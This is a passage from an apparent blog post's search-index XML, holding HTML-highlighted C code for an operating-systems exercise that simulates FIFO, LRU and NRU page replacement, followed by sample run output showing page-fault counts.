a[i][j] = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印结果</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">printresult</span><span class="params">(<span class="type">int</span>** a, <span class="type">int</span>* str)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;**************************** Orders of Pages ************************\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%3d&quot;</span>, str[i]);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[j][i] == <span class="number">-1</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%3d&quot;</span>, a[j][i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化链表</span></span><br><span class="line">qlink <span class="title function_">initlink</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放链表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">release_link</span><span class="params">(qlink l)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (l) &#123;</span><br><span class="line">        qlink temp = l;</span><br><span class="line">        l = l-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// FIFO算法</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">fifo</span><span class="params">(<span class="type">int</span>* str)</span> &#123;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>, j = <span class="number">0</span>, ** a = initstring();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="type">int</span> flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= m; k++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[i][k] == str[i]) &#123;</span><br><span class="line">                flag = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!flag) &#123;</span><br><span class="line">            count++;</span><br><span class="line">            a[i][j++ % m + <span class="number">1</span>] = str[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i != n) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= m; k++)</span><br><span class="line">                a[i + <span class="number">1</span>][k] = a[i][k];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    printresult(a, str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Page Faults: %d\n&quot;</span>, count);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++) <span class="built_in">free</span>(a[i]);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// LRU算法（基于链表实现）</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">lru</span><span class="params">(<span class="type">int</span>* str)</span> &#123;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>, ** a = initstring();</span><br><span class="line">    qlink head = initlink();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line">        qlink prev = <span class="literal">NULL</span>, curr = head;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查找当前页是否在链表中</span></span><br><span class="line">        <span class="keyword">while</span> (curr) &#123;</span><br><span class="line">            <span class="keyword">if</span> (curr-&gt;data == str[i]) &#123;</span><br><span class="line">                found = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (prev) &#123; <span class="comment">// 如果不是链表头，则移动到头部</span></span><br><span class="line">                    prev-&gt;next = curr-&gt;next;</span><br><span class="line">                    curr-&gt;next = head;</span><br><span class="line">                    head = curr;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            prev = curr;</span><br><span class="line">            curr = curr-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!found) &#123; <span class="comment">// 缓存未命中</span></span><br><span class="line">            count++;</span><br><span class="line">            qlink new_node = (qlink)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(qnode));</span><br><span class="line">            new_node-&gt;data = str[i];</span><br><span class="line">            new_node-&gt;next = head;</span><br><span class="line">            head = new_node;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果超过物理块数量，则删除链表尾部</span></span><br><span class="line">            <span class="type">int</span> node_count = <span class="number">0</span>;</span><br><span class="line">            qlink temp = head, tail = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">while</span> (temp) &#123;</span><br><span class="line">                node_count++;</span><br><span class="line">                <span class="keyword">if</span> (node_count == m)</span><br><span class="line">                    tail = temp;</span><br><span class="line">                temp = temp-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (node_count &gt; m &amp;&amp; tail) &#123;</span><br><span class="line">                temp = tail-&gt;next;</span><br><span class="line">                tail-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">                <span class="built_in">free</span>(temp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 记录链表中的状态</span></span><br><span class="line">        curr = head;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">            a[i][j] = (curr) ? curr-&gt;data : <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">if</span> (curr) curr = curr-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    printresult(a, str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Page Faults: %d\n&quot;</span>, count);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++) <span class="built_in">free</span>(a[i]);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    release_link(head);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NRU算法</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">nru</span><span class="params">(<span class="type">int</span>* str)</span> &#123;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>, ** a = initstring();</span><br><span class="line">    <span class="type">int</span>* frame = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * m);</span><br><span class="line">    <span class="type">int</span>* referenced = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        frame[i] = <span class="number">-1</span>;</span><br><span class="line">        referenced[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (frame[j] == str[i]) &#123;</span><br><span class="line">                found = <span class="number">1</span>;</span><br><span class="line">                referenced[j] = <span class="number">1</span>; <span class="comment">// 设置引用位</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">            count++;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (referenced[j] == <span class="number">0</span>) &#123;</span><br><span class="line">                    frame[j] = str[i];</span><br><span class="line">                    referenced[j] = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                referenced[j] = <span class="number">0</span>; <span class="comment">// 重置引用位</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">            a[i][j + <span class="number">1</span>] = frame[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printresult(a, str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Page Faults: %d\n&quot;</span>, count);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++) <span class="built_in">free</span>(a[i]);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">free</span>(frame);</span><br><span class="line">    <span class="built_in">free</span>(referenced);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主菜单</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">(<span class="type">int</span>* str)</span> &#123;</span><br><span class="line">    <span class="type">int</span> choice;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1. FIFO\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2. LRU\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;3. NRU\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4. Exit\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Choose (1-4): &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">    <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: fifo(str); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: lru(str); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>: nru(str); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>: <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">default</span>: <span class="built_in">printf</span>(<span class="string">&quot;Invalid choice!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主函数</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span>* str = creatstr();</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        menu(str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>运行结果</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. FIFO</span><br><span class="line">2. LRU</span><br><span class="line">3. NRU</span><br><span class="line">4. Exit</span><br><span class="line">Choose (1-4): 1</span><br><span class="line">**************************** Orders of Pages ************************</span><br><span class="line"> 14  9 20  3  9  1  9 17  2  5 19 17  1  7 12  4  5  8 11 15</span><br><span class="line"> 14 14 14  3  3  3  3 17 17 17 19 19 19  7  7  7  5  5  5 15</span><br><span class="line">     9  9  9  9  1  1  1  2  2  2 17 17 17 12 12 12  8  8  8</span><br><span class="line">       20 20 20 20  9  9  9  5  5  5  1  1  1  4  4  4 11 11</span><br><span class="line"></span><br><span class="line">Page Faults: 19</span><br><span class="line">1. FIFO</span><br><span class="line">2. LRU</span><br><span class="line">3. NRU</span><br><span class="line">4. Exit</span><br><span class="line">Choose (1-4): 2</span><br><span class="line">**************************** Orders of Pages ************************</span><br><span class="line"> 14  9 20  3  9  1  9 17  2  5 19 17  1  7 12  4  5  8 11 15</span><br><span class="line"> 14  9 20  3  9  1  9 17  2  5 19 17  1  7 12  4  5  8 11 15</span><br><span class="line">    14  9 20  3  9  1  9 17  2  5 19 17  1  7 12  4  5  8 11</span><br><span class="line">       14  9 20  3  3  1  9 17  2  5 19 17  1  7 12  4  5  8</span><br><span class="line"></span><br><span class="line">Page Faults: 18</span><br><span class="line">1. FIFO</span><br><span class="line">2. LRU</span><br><span class="line">3. NRU</span><br><span class="line">4. Exit</span><br><span class="line">Choose (1-4): 3</span><br><span class="line">**************************** Orders of Pages ************************</span><br><span class="line"> 14  9 20  3  9  1  9 17  2  5 19 17  1  7 12  4  5  8 11 15</span><br><span class="line"> 14 14 20 20 20  1  1  1  2  2 19 19  1  1 12 12  5  5 11 11</span><br><span class="line">     9  9  9  9  9  9  9  9  5  5  5  5  7  7  7  7  8  8  8</span><br><span class="line">           3  3  3  3  3  3  3  3 17 17 17 17 17 17 17 17 15</span><br><span class="line"></span><br><span class="line">Page Faults: 18</span><br><span class="line">1. FIFO</span><br><span class="line">2. LRU</span><br><span class="line">3. NRU</span><br><span class="line">4. Exit</span><br><span class="line">Choose (1-4): 4</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>408</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>C</tag>
      </tags>
  </entry>
</search>
